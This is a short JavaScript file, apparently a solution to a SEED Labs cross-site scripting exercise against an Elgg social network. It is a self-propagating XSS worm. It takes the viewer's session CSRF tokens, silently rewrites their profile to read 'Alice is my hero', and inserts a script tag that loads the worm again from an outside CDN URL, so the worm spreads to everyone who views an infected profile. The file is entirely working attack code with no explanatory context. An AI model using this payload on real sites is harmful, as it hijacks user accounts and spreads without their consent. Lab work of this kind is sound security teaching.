(function () {
    let content = '<h3>Alice is my hero.</h3>';
    let brief_content = '<script src="https://cdn.jsdelivr.net/gh/zsy-arch/js_for_Tjut_IS@main/worm.js">' + '</' + 'script>';
    let aliceGuid = 56;
    let sendurl = "http://www.seed-server.com/action/profile/edit";
    if (elgg.session.user.guid != aliceGuid) {
        let formData = new FormData();
        formData.append('name', elgg.session.user.name);
        formData.append('guid', elgg.session.user.guid);
        formData.append('__elgg_ts', elgg.security.token.__elgg_ts);
        formData.append('__elgg_token', elgg.security.token.__elgg_token);
        formData.append('__token', elgg.security.token.__elgg_token);
        formData.append('__ts', elgg.security.token.__elgg_ts);
        formData.append('description', content);
        formData.append('briefdescription', brief_content);
        $.ajax({
            method: 'POST',
            url: sendurl,
            enctype: 'multipart/form-data',
            contentType: false,
            processData: false,
            async: true,
            cache: false,
            data: formData
        });
        console.log('Alice is my hero.');
    } else {
        console.log('Hello, hero.');
    }
})();
